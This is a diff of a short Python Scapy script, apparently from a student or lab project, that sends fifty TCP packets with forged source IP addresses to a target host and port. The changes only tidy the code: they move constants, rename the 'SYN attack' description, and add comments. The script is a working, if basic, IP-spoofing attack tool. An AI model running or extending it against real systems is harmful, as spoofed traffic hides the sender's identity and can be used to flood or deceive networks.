@@ -2,15 +2,11 @@
 Authors : Fridez Lucas, Maxime Welcklen
 Attack :  Very basic TCP spoofing over N packets
 """
+
+# Imports
 from scapy.all import *
 from scapy.layers.inet import *
 import argparse
-
-
-B = "192.168.1.103"  # destination IP address
-
-D = 9999  # destination port
-payload = "Hello from scappy spoofing !"  # packet payload
 
 
 def __configure_argparse__():
@@ -20,7 +16,7 @@ def __configure_argparse__():
        parser: Arguments parser
     """
     parser = argparse.ArgumentParser(
-        description='SYN attack arguments')
+        description='Spoofing attack arguments')
 
     # Required params
     requiredNamed = parser.add_argument_group('Optionnal named arguments')
@@ -39,16 +35,22 @@ def main(destination_ip, dport, iface):
 
     Args:
        destination_ip (str): Destination IP
+       dport (int) : Destination port
+       iface (str) : Network interface
     """
     SOURCE_IP = "1.2.3."
     SOURCE_PORT = RandShort()
+    PAYLOAD = "Hello from scappy spoofing !"  # packet payload
 
     # Send 50 packets to be really visible
     for i in range(50, 100):
         spoofed_packet = IP(src=f"{SOURCE_IP}{i}", dst=destination_ip) / \
-            TCP(sport=SOURCE_PORT, dport=dport) / payload
+            TCP(sport=SOURCE_PORT, dport=dport) / PAYLOAD
         send(spoofed_packet, iface=iface)
 
+
+# Entry point
+# Run this script in sudo mode !
 if __name__ == "__main__":
     parser = __configure_argparse__()
     args = parser.parse_args()
